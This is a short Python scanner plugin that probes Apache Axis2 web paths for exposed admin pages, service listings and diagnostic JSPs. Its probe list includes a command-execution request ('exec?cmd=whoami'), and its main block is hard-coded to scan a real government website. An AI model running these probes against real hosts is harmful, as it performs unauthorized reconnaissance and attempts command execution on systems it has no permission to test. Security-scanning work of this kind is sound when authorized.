#!/usr/bin/env python
#-*- coding:utf-8 -*-
#__SerType:Aixs2 information detection 


def assign(service, arg):
    if service =="axis2":
        return True, arg
 
def audit(arg):
    payload=('axis2-web/HappyAxis.jsp', 
        'axis2-admin/login',
        'axis2/axis2-admin',
        'servlet/AxisServlet',
        'axis/Calculator.jws',
        'axis2-admin/',
        'HappyAxis.jsp',
        'axis/happyaxis.jsp',
        'axis2/axis2-web/HappyAxis.jsp',
        'services/AdminService?wsdl',
        'services/Version?wsdl',
        'axis2/services/listServices',
        'services/config/exec?cmd=whoami',
        )
    for payloads in payload:
        url = arg + payloads
        code, head, res, errcode,finalurl =  curl.curl(url)
        if code == 200:
            security_info(url)
 
if __name__ =='__main__':
    from dummy import*
    audit(assign('axis2', 'http://snies.mineducacion.gov.co/')[1])